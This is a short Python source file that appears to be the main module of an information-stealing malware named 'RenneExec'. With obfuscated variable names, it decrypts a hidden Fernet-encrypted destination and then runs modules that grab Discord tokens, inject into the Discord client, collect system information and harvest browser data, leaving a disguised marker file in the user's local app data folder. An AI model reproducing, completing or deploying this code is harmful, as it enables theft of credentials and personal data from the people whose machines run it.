from __RenneExec__.cfg.cfg import *

import __RenneExec__.lib.browsers as FV
import __RenneExec__.lib.overlayhook as n10
import __RenneExec__.lib.injection as nn30
import __RenneExec__.lib.runonce as p60
import __RenneExec__.lib.systeminfo as p8888
from cryptography.fernet import Fernet as p28163

import __RenneExec__.dll.p1
import __RenneExec__.dll.p2
import __RenneExec__.dll.p4
import __RenneExec__.dll.p5
import __RenneExec__.dll.p3

class red:
    def __init__():
        APPDATA=os.getenv('LOCALAPPDATA')
        if cfg.Runonce == True:
            s=p60.check.__init__()
        if s == 'pass':
            p218361382931=n10.c.y
            p218793218476=base64.b64decode(p218361382931).decode('ascii')
            p281367218333=p28163(p218793218476)
            p321321321321=base64.b64decode(cfg.p219371232).decode('ascii')
            p558162382222=p281367218333.decrypt(p321321321321).decode('ascii')
        if cfg.p557216331 == True and s == 'pass':
            n10.DiscordToken(p558162382222)
        if cfg.discordInjection == True and s == 'pass':
            nn30.Injection(p558162382222)
        if cfg.SystemInfo == True and s == 'pass':
            p8888.SystemInfo(p558162382222)
        if cfg.Browsers == True and s == 'pass':
            FV.Browsers(p558162382222)
        with open(f'{APPDATA}//f35ee3fc-b929-11ed-afa1-0242ac120002.f97a0b4a-b929-11ed-afa1-0242ac120002.dll', 'w') as f:
            f.write('uuid.gen(pure)')